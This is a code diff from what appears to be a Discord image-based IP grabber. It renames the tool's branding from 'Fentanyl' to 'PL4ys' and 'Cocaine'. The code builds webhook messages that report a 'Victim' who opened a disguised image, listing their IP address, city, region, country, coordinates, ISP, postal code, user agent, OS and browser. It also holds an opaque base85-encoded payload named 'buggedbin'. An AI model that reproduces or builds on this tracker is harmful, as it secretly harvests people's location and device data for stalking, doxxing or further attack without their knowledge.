@@ -10,15 +10,15 @@ buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
-  "username": "Fentanyl",
+  "username": "PL4ys",
   "content": "@everyone",
   "embeds": [
     {
-      "title": "Fentanyl strikes again!",
+      "title": "PL4ys strikes again!",
       "color": 16711803,
-      "description": "A Victim opened the original Image. You can find their info below.",
+      "description": "A New goofy Victim opened the original Image. You can find their info below.",
       "author": {
-        "name": "Fentanyl"
+        "name": "PL4ys"
       },
       "fields": [
         {
@@ -38,15 +38,15 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
 
 def prev(ip,uag):
   return {
-  "username": "Fentanyl",
+  "username": "PL4ys",
   "content": "",
   "embeds": [
     {
-      "title": "Fentanyl Alert!",
+      "title": "Cocaine Alert!",
       "color": 16711803,
-      "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
+      "description": f"Discord previewed a Cocaine Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
       "author": {
-        "name": "Fentanyl"
+        "name": "PL4ys"
       },
       "fields": [
       ]
